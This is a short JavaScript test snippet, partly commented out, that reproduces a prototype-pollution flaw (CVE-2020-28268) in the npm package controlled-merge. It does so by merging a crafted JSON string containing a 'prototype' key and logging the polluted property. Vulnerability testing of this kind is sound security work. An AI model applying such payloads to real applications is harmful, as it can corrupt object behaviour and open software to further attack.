// //https://www.whitesourcesoftware.com/vulnerability-database/CVE-2020-28268
// test("prototype pollution in controlled-merge ", () => {
console.log({}.polluted);

  const merge = require("controlled-merge");
  const obj = merge(
    {},
    JSON.parse(
      '{ "testProperty": "hi", "prototype" : { "polluted" : "yes" } }'
    ),
    true
  );

console.log("{ " + obj.prototype.polluted + ", " + "yes" + " }");
// });
